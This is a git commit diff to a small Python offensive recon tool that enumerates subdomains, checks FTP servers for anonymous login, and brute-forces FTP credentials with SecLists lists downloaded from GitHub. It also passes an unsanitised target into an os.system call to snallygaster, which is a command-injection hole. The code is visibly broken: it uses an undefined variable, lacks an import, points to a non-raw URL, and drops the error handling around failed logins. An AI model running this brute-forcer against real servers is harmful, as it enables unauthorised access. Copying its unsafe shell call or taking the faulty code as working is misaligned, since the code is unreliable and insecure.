3a621a221b39c1c47dd26436c0f2a3a2312ea238
Your Name <you@example.com>
2019-01-09 15:41:12 -0500

    updates

--- bruteforceftp.py
+++ bruteforceftp.py
@@ -1,7 +1,13 @@
 from ftplib import FTP
+import socket
+import requests
 
 def check_anonymous_login(target):
-    ftp = FTP(target)
+    try:
+        ftp = FTP(target)
+    except socket.gaierror:
+        print("not a correct servername")
+        return 1
     ftp.login()
     print "\n[+] Anonymous login is open."
     print "\n[+] Username : anonymous"
@@ -9,22 +15,22 @@ def check_anonymous_login(target):
     ftp.quit()
 
 def ftp_login(target, username, password):
-    try:
-        ftp = FTP(target)
-        ftp.login(username, password)
-        ftp.quit()
-        print "\n[!] Credentials have found."
-        print "\n[!] Username : {}".format(username)
-        print "\n[!] Password : {}".format(password)
-        sys.exit(0)
-    except:
-        pass
+    ftp = FTP(target)
+    ftp.login(username, password)
+    ftp.quit()
+    print "\n[!] Credentials have found."
+    print "\n[!] Username : {}".format(username)
+    print "\n[!] Password : {}".format(password)
+    sys.exit(0)
 
 def brute_force(target):
-    # Fix this so it iterates through usernames and passwords in SecLists
-    wordlist = open(wordlist, "r")
-    words = wordlist.readlines()
+    username_response = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/cirt-default-usernames.txt")
+    username = username_response.text.split('\n')
+    passwords_response = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt")
+    passwords = passwords_response.text.split('\n')
+    
     for word in words:
+        # not done
         word = word.strip()
         ftp_login(target, username, word)
 
--- main.py
+++ main.py
@@ -1,4 +1,5 @@
 from subbrute import subbrute
+import os
 import argparse
 import sys
 from bruteforceftp import check_anonymous_login, brute_force
@@ -6,20 +7,36 @@ from bruteforceftp import check_anonymous_login, brute_force
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-t", "--target")
+parser.add_argument("-e", "--dnsenum")
+parser.add_argument('-d', '--domlink')
+parser.add_argument('-s', '--sqlmap')
+parser.add_argument('-n', '--snallygaster')
 
 args = parser.parse_args()
 
-if not args.target: 
-    print("Need a target")
-    sys.exit(0)
-
 target = args.target
+dnsenum = args.dnsenum
+domlink = args.domlink
+snallygaster = args.snallygaster
 
-for d in subbrute.run(target):
-    print d 
-    if 'ftp' in d[0]:
-        print(d[0])
-        print 'found ftp'
-        check_anonymous_login(d[0])
-        brute_force(d[0])
+if dnsenum:
+    for d in subbrute.run(target):
+        print d 
+        if 'ftp' in d[0]:
+            print(d[0])
+            print 'found ftp'
+            result = check_anonymous_login(d[0])
+            if result == 1: # means correct addr was not provided
+                continue
+            brute_force(d[0])
+
+if domlink:
+    # need api key
+    pass
+
+if snallygaster:
+    try:
+        os.system('snallygaster %s -d' % target)
+    except:
+        print("u dont have snallygaster installed; do pip3 install snallygaster")
 
